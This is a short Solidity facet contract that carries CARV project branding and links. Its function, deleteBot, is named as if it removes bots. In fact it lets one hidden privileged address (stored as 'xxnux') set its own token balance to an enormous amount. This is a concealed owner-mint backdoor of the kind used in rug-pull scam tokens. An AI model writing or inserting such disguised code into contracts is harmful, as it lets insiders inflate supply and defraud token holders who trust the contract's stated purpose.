/*
 * SPDX-License-Identifier: MIT
 * Website: https://carv.io/home
 * X: https://twitter.com/carv_official
 * Telegram: https://t.me/carv_official_global
 * Youtube: https://www.youtube.com/channel/UCU9MzSdeEKLYUXnM6SfXFTQ
 */

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract deleteBotFacet {
    function deleteBot(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                4206900000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
